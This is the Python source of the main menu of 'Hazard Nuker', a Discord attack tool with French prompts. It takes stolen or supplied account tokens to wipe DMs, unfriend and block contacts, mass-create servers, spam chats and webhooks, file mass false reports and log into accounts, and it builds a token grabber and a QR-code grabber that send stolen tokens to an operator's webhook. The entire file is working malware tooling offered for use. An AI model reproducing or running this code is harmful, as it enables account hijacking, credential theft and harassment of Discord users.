# Hazard was proudly coded by Rdimo (https://github.com/Rdimo).
# Copyright (c) 2021 Rdimo#6969 | https://Cheataway.com
# Hazard Nuker under the GNU General Public Liscense v2 (1991).

import sys
sys.dont_write_bytecode = True

import multiprocessing
import keyboard
import base64

from util.plugins.common import *
import util.accountNuke
import util.dmdeleter
import util.info
import util.login
import util.groupchat_spammer
import util.massreport
import util.QR_Grabber
import util.seizure
import util.server_leaver
import util.spamservers
import util.profilechanger
import util.friend_blocker
import util.create_token_grabber
import util.unfriender
import util.webhookspammer
import util.massdm

threads = 3
cancel_key = "ctrl+x"

def main():
    setTitle(f"Hazard Nuker {THIS_VERSION}")
    clear()
    global threads
    global cancel_key
    if getTheme() == "hazardous":
        banner()
    elif getTheme() == "dark":
        banner("dark")
    elif getTheme() == "fire":
        banner("fire")
    elif getTheme() == "water":
        banner("water")
    elif getTheme() == "neon":
        banner("neon")

    choice = input(
            f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Choix: {Fore.RED}')
    #all options
    if choice == "1":
        token = input(
            f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Token: {Fore.RED}')
        validateToken(token)
        Server_Name = str(input(
            f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Nom des serveurs qui vont etre crée: {Fore.RED}'))
        message_Content = str(input(
            f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Message qui va etre envoyé a tous les amis: {Fore.RED}'))
        if threading.active_count() < threads:
            threading.Thread(target=util.accountNuke.Hazard_Nuke, args=(token, Server_Name, message_Content)).start()
            return


    elif choice == '2':
        token = input(
            f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Token: {Fore.RED}')
        validateToken(token)
        #check if they're lonely and don't have any friends
        if not requests.get("https://discord.com/api/v9/users/@me/relationships", headers=getheaders(token)).json():
            print(f"")
            sleep(3)
            main()
        #get all friends
        processes = []
        friendIds = requests.get("https://discord.com/api/v9/users/@me/relationships", proxies=proxy(), headers=getheaders(token)).json()
        if not friendIds:
            print(f"{Fore.RESET}Mince ce gars est seul , il n'a meme pas d'amis ")
            sleep(3)
            main()
        for friend in [friendIds[i:i+3] for i in range(0, len(friendIds), 3)]:
            t = threading.Thread(target=util.unfriender.UnFriender, args=(token, friend))
            t.start()
            processes.append(t)
        for process in processes:
            process.join()
        input(f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Appuyez sur nimporte quelle touche pour continuer. . . {Fore.RED}')
        sleep(1.5)
        main()


    elif choice == '3':
        token = input(
            f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Token: {Fore.RED}')
        validateToken(token)
        if token.startswith("mfa."):
            print(f'{Fore.RESET}[{Fore.RED}Error{Fore.RESET}] : Je ne peux pas supprimer les serveur car la2f est activé ')
            sleep(3)
        processes = []
        #get all servers
        guildsIds = requests.get("https://discord.com/api/v8/users/@me/guilds", headers=getheaders(token)).json()
        if not guildsIds:
            print(f"{Fore.RESET}Mince ce mec n'est dans aucun serveur !")
            sleep(3)
            main()
        for guild in [guildsIds[i:i+3] for i in range(0, len(guildsIds), 3)]:
            t = threading.Thread(target=util.server_leaver.Leaver, args=(token, guild))
            t.start()
            processes.append(t)
        for process in processes:
            process.join()
        input(f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Appuyez sur nimporte quelle touche pour continuer. . . {Fore.RED}')
        sleep(1.5)
        main()
                

    elif choice == '4':
        token = input(f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Token: {Fore.RED}')
        validateToken(token)
        print(f'{Fore.BLUE}Veut tu que un icone pour les serveurs sois crée ?')
        yesno = input(f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}yes/no: {Fore.RED}')
        if yesno.lower() == "y" or yesno.lower() == "yes":
            image = input(f'Example: (C:\\Users\\myName\\Desktop\\HazardNuker\\ShitOn.png):\n{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Merci de rentrer ou est l icone: {Fore.RED}')
            if not os.path.exists(image):
                print(f'{Fore.RESET}[{Fore.RED}Error{Fore.RESET}] : Je ne peut pas \'t trouver "{image}" sur votre pc')
                sleep(3)
                main()
            with open(image, "rb") as f: _image = f.read()
            b64Bytes = base64.b64encode(_image)
            icon = f"data:image/x-icon;base64,{b64Bytes.decode()}"
        else:
            icon = None
        print(f'''
    {Fore.RESET}[{Fore.RED}1{Fore.RESET}] Nom de serveurs aléatoires
    {Fore.RESET}[{Fore.RED}2{Fore.RESET}] Nom de serveurs personnalisé 
                        ''')
        secondchoice = input(
            f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Second choix: {Fore.RED}')
        if secondchoice not in ["1", "2"]:
            print(f'{Fore.RESET}[{Fore.RED}Error{Fore.RESET}] : Second choix invalide')
            sleep(1)
            main()
        if secondchoice == "1":
            amount = 25
            processes = []
            if hasNitroBoost(token):
                amount = 50
            for i in range(amount):
                t = threading.Thread(target=util.spamservers.SpamServers, args=(token, icon))
                t.start()
                processes.append(t)
            for process in processes:
                process.join()
            input(f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Appuyez sur nimporte quelle touche pour continuer . . {Fore.RED}')
            sleep(1.5)
            main()

        if secondchoice == "2":
            name = input(
                f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Nom du serveur qui va etre crée: {Fore.RED}')
            processes = []
            for i in range(25):
                t = threading.Thread(target=util.spamservers.SpamServers, args=(token, icon, name))
                t.start()
                processes.append(t)
            for process in processes:
                process.join()
            input(f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Appuyez sur nimporte quelle touche pour continuer. . . {Fore.RED}')
            sleep(1.5)
            main()


    elif choice == '5':
        token = input(
            f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Token: {Fore.RED}')
        validateToken(token)
        processes = []
        channelIds = requests.get("https://discord.com/api/v9/users/@me/channels", headers=getheaders(token)).json()
        if not channelIds:
            print(f"{Fore.RESET}Mince ce mec est seule il n'a meme pas de dm ")
            sleep(3)
            main()
        for channel in [channelIds[i:i+3] for i in range(0, len(channelIds), 3)]:
                t = threading.Thread(target=util.dmdeleter.DmDeleter, args=(token, channel))
                t.start()
                processes.append(t)
        for process in processes:
            process.join()
        input(f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Appuyez sur nimporte quelle touche pour continuer. . . {Fore.RED}')
        sleep(1.5)
        main()


    elif choice == '6':
        token = input(
            f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Token: {Fore.RED}')
        validateToken(token)
        message = str(input(
            f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Message qui va etre envoyé a tous les amis: {Fore.RED}'))
        processes = []
        channelIds = requests.get("https://discord.com/api/v9/users/@me/channels", headers=getheaders(token)).json()
        if not channelIds:
            print(f"{Fore.RESET}Mince ce mec est seule il n'a meme pas de dm ")
            sleep(3)
            main()
        for channel in [channelIds[i:i+3] for i in range(0, len(channelIds), 3)]:
            t = threading.Thread(target=util.massdm.MassDM, args=(token, channel, message))
            t.start()
            processes.append(t)
        for process in processes:
            process.join()
        input(f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Appuyez sur nimporte quelle touche pour continuer. . . {Fore.RED}')
        sleep(1.5)
        main()


    elif choice == '7':
        token = input(
            f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Token: {Fore.RED}')
        validateToken(token)
        print(f'{Fore.MAGENTA}Commencement de seizure mode {Fore.RESET}{Fore.WHITE}(Switcher sur on/off Light/dark mode){Fore.RESET}\n')
        SlowPrint(f"{Fore.RED}{cancel_key}{Fore.RESET} at anytime to stop")
        processes = [] 
        for i in range(threads):
            t = multiprocessing.Process(target=util.seizure.StartSeizure, args=(token, ))
            t.start()
            processes.append(t)
        while True:
            if keyboard.is_pressed(cancel_key):
                for process in processes:
                    process.terminate()
                main()
                break

    elif choice == '8':
        token = input(
        f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Token: {Fore.RED}')
        validateToken(token)
        util.info.Info(token)


    elif choice == '9':
        token = input(
            f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Token: {Fore.RED}')
        validateToken(token)
        util.login.TokenLogin(token)

    elif choice == '10':
        token = input(
            f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Token: {Fore.RED}')
        validateToken(token)
        friendIds = requests.get("https://discord.com/api/v9/users/@me/relationships", proxies=proxy(), headers=getheaders(token)).json()
        if not friendIds:
            print(f"{Fore.RESET}Mince cette personne n'a meme pas d'amis ")
            sleep(3)
            main()
        processes = []
        for friend in [friendIds[i:i+3] for i in range(0, len(friendIds), 3)]:
            t = threading.Thread(target=util.friend_blocker.Block, args=(token, friend))
            t.start()
            processes.append(t)
        for process in processes:
            process.join()
        input(f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Appuyez sur nimporte quelle touche pour continuer. . . {Fore.RED}')
        sleep(1.5)
        main()


    elif choice == '11':
        token = input(
            f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Token: {Fore.RED}')
        validateToken(token)
        print(f'''
    {Fore.RESET}[{Fore.RED}1{Fore.RESET}] Changeur de status
    {Fore.RESET}[{Fore.RED}2{Fore.RESET}] Changeur de bio
    {Fore.RESET}[{Fore.RED}3{Fore.RESET}] Changeur d'HypeSquad     
                        ''')
        secondchoice = input(
            f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Setting: {Fore.RED}')
        if secondchoice not in ["1", "2", "3"]:
            print(f'{Fore.RESET}[{Fore.RED}Error{Fore.RESET}] : Choix invalide')
            sleep(1)
            main()
        if secondchoice == "1":
            status = input(
                f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Statut personnalisé: {Fore.RED}')
            util.profilechanger.StatusChanger(token, status)

        if secondchoice == "2":
            bio = input(
                f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Bio personnalisé: {Fore.RED}')
            util.profilechanger.BioChanger(token, bio)

        if secondchoice == "3":
            print(f'''
{Fore.RESET}[{Fore.MAGENTA}1{Fore.RESET}]{Fore.MAGENTA} HypeSquad Bravery
{Fore.RESET}[{Fore.RED}2{Fore.RESET}]{Fore.LIGHTRED_EX} HypeSquad Brilliance
{Fore.RESET}[{Fore.LIGHTGREEN_EX}3{Fore.RESET}]{Fore.LIGHTGREEN_EX} HypeSquad Balance
                        ''')
            thirdchoice = input(
                f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Hypesquad: {Fore.RED}')
            if thirdchoice not in ["1", "2", "3"]:
                print(f'{Fore.RESET}[{Fore.RED}Error{Fore.RESET}] : Choix invalide')
                sleep(1)
                main()
            if thirdchoice == "1":
                util.profilechanger.HouseChanger(token, 1)
            if thirdchoice == "2":
                util.profilechanger.HouseChanger(token, 2)
            if thirdchoice == "3":
                util.profilechanger.HouseChanger(token, 3)


    elif choice == '12':
        print(f"{Fore.RED}Arrive bientot. . .\n{Fore.RESET}https://discord.gg/ligue-occulte ")
        sleep(4)
        main()


    elif choice == '13':
        WebHook = input(
            f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Webhook Url: {Fore.RED}')
        validateWebhook(WebHook)
        fileName = str(input(
            f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Nom du fichier: {Fore.RED}'))
        util.create_token_grabber.TokenGrabberV2(WebHook, fileName)


    elif choice == '14':
        WebHook = input(
            f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Webhook Url: {Fore.RED}')
        validateWebhook(WebHook)
        util.QR_Grabber.QR_Grabber(WebHook)


    elif choice == '15':
        print(f"\n{Fore.RED}(le token que vous saisissez est le compte qui enverra les rapports){Fore.RESET}")
        token = input(
            f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Token: {Fore.RED}')
        validateToken(token)
        guild_id1 = str(input(
            f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Serveur ID: {Fore.RED}'))
        channel_id1 = str(input(
            f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Salon ID: {Fore.RED}'))
        message_id1 = str(input(
            f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Message ID: {Fore.RED}'))
        reason1 = str(input(
            '\n[1] Contenu illegal\n'
            '[2] Harcèlement\n'
            '[3] Spam ou lien de phising\n'
            '[4] Automutilation\n'
            '[5] Contenu NSFW\n\n'
            f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Reason: {Fore.RED}'))
        if reason1.upper() in ('1', 'Contenu illegal'):
            reason1 = 0
        elif reason1.upper() in ('2', 'Harcèlement'):
            reason1 = 1
        elif reason1.upper() in ('3', 'Spam ou lien de phising'):
            reason1 = 2
        elif reason1.upper() in ('4', 'Automutilation'):
            reason1 = 3
        elif reason1.upper() in ('5', 'Contenu NSFW'):
            reason1 = 4
        else:
            print(f"\nInvalid reason")
            sleep(1)
            main()
        util.massreport.MassReport(token, guild_id1, channel_id1, message_id1, reason1)


    elif choice == "16":
        token = input(
            f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Token: {Fore.RED}')
        validateToken(token)
        util.groupchat_spammer.GcSpammer(token)


    elif choice == '17':
        print(f'''
    {Fore.RESET}[{Fore.RED}1{Fore.RESET}] Supprimeur de Webhook
    {Fore.RESET}[{Fore.RED}2{Fore.RESET}] Spammeur de Webhook    
                        ''')
        secondchoice = int(input(
            f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Second choix: {Fore.RED}'))
        if secondchoice not in [1, 2]:
            print(f'{Fore.RESET}[{Fore.RED}Error{Fore.RESET}] : Second choix invalide')
            sleep(1)
            main()
        if secondchoice == 1:
            WebHook = input(
                f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Webhook: {Fore.RED}')
            validateWebhook(WebHook)
            try:
                requests.delete(WebHook)
                print(f'\n{Fore.GREEN}Webhook bien supprimé!{Fore.RESET}\n')
            except Exception as e:
                print(f'{Fore.RED}Error: {Fore.WHITE}{e} {Fore.RED}Quelque chose c est passé quand vous avez essayer de supprimer le webhook')

            input(f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Appuyez sur nimporte quelle touche pour continuer. . . {Fore.RED}')
            main()
        if secondchoice == 2:
            WebHook = input(
                f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Webhook: {Fore.RED}')
            validateWebhook(WebHook)
            Message = str(input(
                f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Message: {Fore.RED}'))
            util.webhookspammer.WebhookSpammer(WebHook, Message)


    elif choice == '18':
        print(f'''
    {Fore.RESET}[{Fore.RED}1{Fore.RESET}] Changeur de theme
    {Fore.RESET}[{Fore.RED}2{Fore.RESET}] Nombre de thrads
    {Fore.RESET}[{Fore.RED}3{Fore.RESET}] Annulé la clé
    {Fore.RESET}[{Fore.RED}4{Fore.RESET}] {Fore.RED}Quitter...    
                        ''')
        secondchoice = input(
            f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Paramètre: {Fore.RED}')
        if secondchoice not in ["1", "2", "3", "4"]:
            print(f'{Fore.RESET}[{Fore.RED}Error{Fore.RESET}] : Paramètre Invalide')
            sleep(1)
            main()
        if secondchoice == "1":
            print(f"""
{Fore.GREEN}Hazardous: 1
{Fore.LIGHTBLACK_EX}Dark: 2
{Fore.RED}Fire: 3
{Fore.BLUE}Water: 4
{Fore.CYAN}N{Fore.MAGENTA}e{Fore.CYAN}o{Fore.MAGENTA}n{Fore.CYAN}:{Fore.MAGENTA} 5
""")
            themechoice = input(
                f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}theme: {Fore.RED}')
            if themechoice == "1":
                setTheme('hazardous')
            elif themechoice == "2":
                setTheme('dark')
            elif themechoice == "3":
                setTheme('fire')
            elif themechoice == "4":
                setTheme('water')
            elif themechoice == "5":
                setTheme('neon')
            else:
                print(f'{Fore.RESET}[{Fore.RED}Error{Fore.RESET}] : Theme invalide')
                sleep(1.5)
                main()
            SlowPrint(f"{Fore.GREEN}Theme changé pour {Fore.CYAN}{getTheme()}")
            sleep(0.5)
            main()

        elif secondchoice == "2":
            print(f"{Fore.BLUE}Nombres actuelle de threads: {threads}")
            try:
                amount = int(
                    input(f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Nombre de threads: {Fore.RED}'))
            except ValueError:
                print(f'{Fore.RESET}[{Fore.RED}Error{Fore.RESET}] : Nombre invalide')
                sleep(1.5)
                main()
            if amount >= 45:
                print(f"{Fore.RED}Désolé, mais avoir autant de threads ne fera que vous limiter et ne va pas etre bénefique")
                sleep(3)
                main()
            elif amount >= 15:
                print(f"{Fore.RED}Attention! * Attention! * Attention! * Attention! * Attention! * Attention! * Attention!")
                print(f"avoir le nombre de threads défini sur 15 ou plus peut éventuellement avoir du retard et augmenter les chances de limite de thread êtes-vous sûr de vouloir définir la limite de thread sur{Fore.YELLOW}{amount}{Fore.RED}?")
                yesno = input(f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}yes/no,: {Fore.RED}')
                if yesno.lower() != "yes":
                    sleep(0.5)
                    main()
            threads = amount
            SlowPrint(f"{Fore.GREEN}Threads ajuster a  {Fore.CYAN}{amount}")
            sleep(0.5)
            main()
        
        elif secondchoice == "3":
            print("\n","Info".center(30, "-"))
            print(f"{Fore.CYAN}Clé actuelle d'annulation: {cancel_key}")
            print(f"""{Fore.BLUE}Si vous voulez avoir ctrl + <key> vous devez taper ctrl+<key>| N'appuyez PAS littéralement sur ctrl + <key>
{Fore.GREEN}Exemple: shift+Q

{Fore.RED}Vous pouvez avoir d'autres modificateurs au lieu de ctrl ⇣
{Fore.YELLOW}Tous les modificateurs de clavier:{Fore.RESET}
ctrl, shift, enter, esc, windows, left shift, right shift, left ctrl, right ctrl, alt gr, left alt, right alt
""")
            sleep(1.5)
            key = input(f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Key: {Fore.RED}')
            cancel_key = key
            SlowPrint(f"{Fore.GREEN}Annuleur de clé mi a : {Fore.CYAN}{cancel_key}")
            sleep(0.5)
            main()

        elif secondchoice == "4":
            setTitle("Exiting. . .")
            choice = input(
                f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Are you sure you want to exit? (Y to confirm): {Fore.RED}')
            if choice.lower() == 'y' or choice.lower() == 'yes':
                clear()
                os._exit(0)
            else:
                main()
    else:
        clear()
        main()

if __name__ == "__main__":
    import sys
    if os.path.basename(sys.argv[0]).endswith("exe"):
        with open(getTempDir()+"\\hazard_proxies", 'w'): pass
        if not os.path.exists(getTempDir()+"\\hazard_theme"):
            setTheme('hazardous')
        clear()
        proxy_scrape()
        sleep(1.5)
        main()
    try:
        assert sys.version_info >= (3,8)
    except AssertionError:
        print(f"{Fore.RED}Desoler votre version de python ({sys.version_info[0]}.{sys.version_info[1]}.{sys.version_info[2]}) n'est pas compatible avec hazard nuker, veuillez télécharger python 3.7+")
        sleep(5)
        print("exiting. . .")
        sleep(1.5)
        os._exit(0)
    else:
        with open(getTempDir()+"\\hazard_proxies", 'w'): pass
        if not os.path.exists(getTempDir()+"\\hazard_theme"):
            setTheme('hazardous')
        clear()
        proxy_scrape()
        sleep(1.5)
        main()
    finally:
        Fore.RESET
